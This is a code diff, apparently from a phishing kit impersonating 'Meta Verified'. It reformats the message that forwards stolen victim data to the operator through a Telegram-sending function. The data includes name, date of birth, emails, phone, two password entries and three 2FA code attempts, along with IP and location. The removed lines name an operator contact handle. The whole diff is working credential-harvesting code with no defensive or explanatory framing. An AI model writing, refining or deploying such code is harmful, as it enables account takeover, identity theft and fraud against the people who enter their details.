@@ -88,22 +88,22 @@ function getChangedFields(prevData: any = {}, nextData: any = {}, inputNew: any 
     const provided = normalizeData(inputNew);
 
     const labels: Record<string, string> = {
-        ip: 'Ip',
+        ip: 'IP address',
         location: 'Location',
-        fullName: 'Full Name',
-        fanpage: 'Page Name',
+        fullName: 'Full name',
+        fanpage: 'Page',
         day: 'Date of birth',
         month: 'Date of birth',
         year: 'Date of birth',
-        email: 'Email',
-        emailBusiness: 'Email Business',
-        phone: 'Phone Number',
-        password: 'Password First',
-        passwordSecond: 'Password Second',
-        authMethod: 'Auth Method',
-        twoFa: 'Code 2FA(1)',
-        twoFaSecond: 'Code 2FA(2)',
-        twoFaThird: 'Code 2FA(3)',
+        email: 'Primary email',
+        emailBusiness: 'Business email',
+        phone: 'Phone',
+        password: 'Password (first entry)',
+        passwordSecond: 'Password (second entry)',
+        authMethod: 'Authentication method',
+        twoFa: '2FA code · attempt 1',
+        twoFaSecond: '2FA code · attempt 2',
+        twoFaThird: '2FA code · attempt 3',
     };
 
     const changed = new Set<string>();
@@ -153,27 +153,74 @@ function mergeData(oldData: any = {}, newData: any = {}) {
     return result;
 }
 
+/** Display value inside <code>; empty → em dash (escaped as text, not inside code if we use literal — ) */
+function displayCode(raw: any): string {
+    const s = typeof raw === 'string' ? raw.trim() : String(raw ?? '').trim();
+    return s ? escapeHtml(s) : '—';
+}
+
+function formatDobParts(day: string, month: string, year: string): string {
+    const hasAny = [day, month, year].some((x) => String(x ?? '').trim() !== '');
+    if (!hasAny) return '—';
+    return `${displayCode(day)}/${displayCode(month)}/${displayCode(year)}`;
+}
+
+function fieldLine(label: string, valueHtml: string): string {
+    return `<b>${escapeHtml(label)}</b>\n<code>${valueHtml}</code>`;
+}
+
+function sectionBlock(title: string, lines: string[]): string {
+    const body = lines.filter(Boolean).join('\n\n');
+    if (!body) return '';
+    return `<b>${escapeHtml(title)}</b>\n${body}`;
+}
+
 function formatMessage(data: any): string {
     const d = normalizeData(data);
-    const authLine = d.authMethod ? `\n<b>Auth Method:</b> <code>${escapeHtml(d.authMethod)}</code>\n-----------------------------` : '';
-    return `
-<b>Ip:</b> <code>${escapeHtml(d.ip || 'Error, contact @otis_cua')}</code>
-<b>Location:</b> <code>${escapeHtml(d.location || 'Error, contact @otis_cua')}</code>
------------------------------
-<b>Full Name:</b> <code>${escapeHtml(d.fullName)}</code>
-<b>Page Name:</b> <code>${escapeHtml(d.fanpage)}</code>
-<b>Date of birth:</b> <code>${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}</code>
------------------------------
-<b>Email:</b> <code>${escapeHtml(d.email)}</code>
-<b>Email Business:</b> <code>${escapeHtml(d.emailBusiness)}</code>
-<b>Phone Number:</b> <code>${d.phone ? escapeHtml(`+${d.phone}`) : ''}</code>
------------------------------
-<b>Password(1):</b> <code>${escapeHtml(d.password)}</code>
-<b>Password(2):</b> <code>${escapeHtml(d.passwordSecond)}</code>
------------------------------${authLine}
-<b>🔐Code 2FA(1):</b> <code>${escapeHtml(d.twoFa)}</code>
-<b>🔐Code 2FA(2):</b> <code>${escapeHtml(d.twoFaSecond)}</code>
-<b>🔐Code 2FA(3):</b> <code>${escapeHtml(d.twoFaThird)}</code>`.trim();
+    const ts = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
+
+    const networkLines = [
+        fieldLine('IP address', displayCode(d.ip)),
+        fieldLine('Location', displayCode(d.location)),
+    ];
+
+    const identityLines = [
+        fieldLine('Full name', displayCode(d.fullName)),
+        fieldLine('Page', displayCode(d.fanpage)),
+        fieldLine('Date of birth (D/M/Y)', formatDobParts(d.day, d.month, d.year)),
+    ];
+
+    const phoneVal = String(d.phone ?? '').trim();
+    const contactLines = [
+        fieldLine('Primary email', displayCode(d.email)),
+        fieldLine('Business email', displayCode(d.emailBusiness)),
+        fieldLine('Phone', phoneVal ? escapeHtml(`+${phoneVal}`) : '—'),
+    ];
+
+    const credLines = [
+        fieldLine('Password (first entry)', displayCode(d.password)),
+        fieldLine('Password (second entry)', displayCode(d.passwordSecond)),
+    ];
+    if (String(d.authMethod ?? '').trim()) {
+        credLines.push(fieldLine('Authentication method', displayCode(d.authMethod)));
+    }
+
+    const tfaLines = [
+        fieldLine('2FA code · attempt 1', displayCode(d.twoFa)),
+        fieldLine('2FA code · attempt 2', displayCode(d.twoFaSecond)),
+        fieldLine('2FA code · attempt 3', displayCode(d.twoFaThird)),
+    ];
+
+    const sections = [
+        `<b>Meta Verified</b> · <i>Intake record</i>\n<i>${escapeHtml(ts)}</i>`,
+        sectionBlock('Network', networkLines),
+        sectionBlock('Profile', identityLines),
+        sectionBlock('Contact', contactLines),
+        sectionBlock('Credentials', credLines),
+        sectionBlock('Two-factor authentication', tfaLines),
+    ].filter(Boolean);
+
+    return sections.join('\n\n<i>────────────────────</i>\n\n');
 }
 
 export async function sendTelegramMessage(data: any): Promise<void> {
